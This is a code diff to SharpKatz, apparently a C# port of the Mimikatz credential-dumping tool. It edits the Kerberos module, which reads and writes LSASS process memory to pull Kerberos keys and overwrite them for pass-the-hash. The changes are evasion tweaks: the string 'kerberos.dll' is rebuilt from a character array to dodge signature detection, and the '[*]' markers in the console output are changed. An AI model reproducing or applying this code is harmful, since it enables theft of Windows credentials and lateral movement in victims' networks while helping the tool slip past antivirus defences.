@@ -331,7 +331,8 @@ namespace SharpKatz.Module
         public static List<KerberosLogonItem> FindCredentials(IntPtr hLsass, IntPtr msvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
             IntPtr kerbUnloadLogonSessionTableAddr;
-            kerbUnloadLogonSessionTableAddr = Utility.GetListAdress(hLsass, msvMem, "kerberos.dll", max_search_size, oshelper.KerbUnloadLogonSessionTableOffset, oshelper.KerbUnloadLogonSessionTableSign);
+            string sKerb = new string(new char[] { 'k','e','r','b','e','r','o','s','.','d','l','l' });
+            kerbUnloadLogonSessionTableAddr = Utility.GetListAdress(hLsass, msvMem, sKerb, max_search_size, oshelper.KerbUnloadLogonSessionTableOffset, oshelper.KerbUnloadLogonSessionTableSign);
 
             //GetKerberosLogonList(ref hLsass, kerbUnloadLogonSessionTableAddr, oshelper, iv, aeskey, deskey, logonlist);
 
@@ -570,7 +571,7 @@ namespace SharpKatz.Module
 
             byte[] hashpassBytes = Utility.ReadFromLsass(ref hLsass, IntPtr.Add(pKeyList, Marshal.SizeOf(typeof(KIWI_KERBEROS_KEYS_LIST_6))), readsize);
 
-            Console.WriteLine("[*]  \\_ kerberos - data copy @ {0:X}", IntPtr.Add(pKeyList, Marshal.SizeOf(typeof(KIWI_KERBEROS_KEYS_LIST_6))).ToInt64());
+            Console.WriteLine("     \\_ kerberos - data copy @ {0:X}", IntPtr.Add(pKeyList, Marshal.SizeOf(typeof(KIWI_KERBEROS_KEYS_LIST_6))).ToInt64());
 
             pthData.isReplaceOk = true;
             for (int i = 0; (i < items) && pthData.isReplaceOk; i++)
@@ -607,13 +608,13 @@ namespace SharpKatz.Module
                 }
                 else
                 {
-                    Console.WriteLine("[*]    \\_ {0} -> null", keyentry);
+                    Console.WriteLine("       \\_ {0} -> null", keyentry);
                 }
 
                 if (bytesToWrite != null)
                 {
                     pthData.isReplaceOk = Utility.WriteToLsass(ref hLsass, checksum.Buffer, bytesToWrite);
-                    Console.WriteLine("[*]    \\_ {0} {1} ", keyentry, (pthData.isReplaceOk) ? "OK" : "null");
+                    Console.WriteLine("       \\_ {0} {1} ", keyentry, (pthData.isReplaceOk) ? "OK" : "null");
                 }
             }
 
@@ -621,7 +622,7 @@ namespace SharpKatz.Module
             {
                 byte[] pasreplace = new byte[oshelper.KerberosPasswordEraseSize];
 
-                Console.WriteLine("[*]    \\_ *Password replace @ {0:X} ({1}) -> null", IntPtr.Add(krbrLogonSession.LogonSessionAddress, oshelper.KerberosOffsetPasswordErase).ToInt64(), oshelper.KerberosPasswordEraseSize);
+                Console.WriteLine("       \\_ *Password replace @ {0:X} ({1}) -> null", IntPtr.Add(krbrLogonSession.LogonSessionAddress, oshelper.KerberosOffsetPasswordErase).ToInt64(), oshelper.KerberosPasswordEraseSize);
 
                 pthData.isReplaceOk = Utility.WriteToLsass(ref hLsass, IntPtr.Add(krbrLogonSession.LogonSessionAddress, oshelper.KerberosOffsetPasswordErase), pasreplace);
                 
